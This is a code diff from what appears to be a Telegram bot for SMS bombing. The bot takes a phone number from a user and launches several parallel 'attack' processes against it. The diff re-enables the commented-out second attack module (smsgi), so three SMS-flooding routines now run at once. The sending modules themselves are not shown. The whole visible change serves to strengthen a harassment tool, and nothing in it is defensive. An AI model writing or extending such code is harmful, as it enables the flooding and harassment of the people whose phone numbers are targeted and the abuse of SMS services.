@@ -3,7 +3,7 @@ import requests
 import re
 import multiprocessing
 from sms import smsg
-#from sms1 import smsgi
+from sms1 import smsgi
 from sms2 import smsgii
 
 # Replace 'YOUR_TOKEN' with your actual bot token obtained from BotFather
@@ -72,10 +72,10 @@ def check_user_access(user_id):
 def handle_phone_number(message):
     phone_number = message.text
     attack1 = multiprocessing.Process(target=smsg, args=[phone_number])
- #   attack2 = multiprocessing.Process(target=smsgi, args=[phone_number])
+    attack2 = multiprocessing.Process(target=smsgi, args=[phone_number])
     attack3 = multiprocessing.Process(target=smsgii, args=[phone_number])
     attack1.start()
-   # attack2.start()
+    attack2.start()
     attack3.start()
     
   
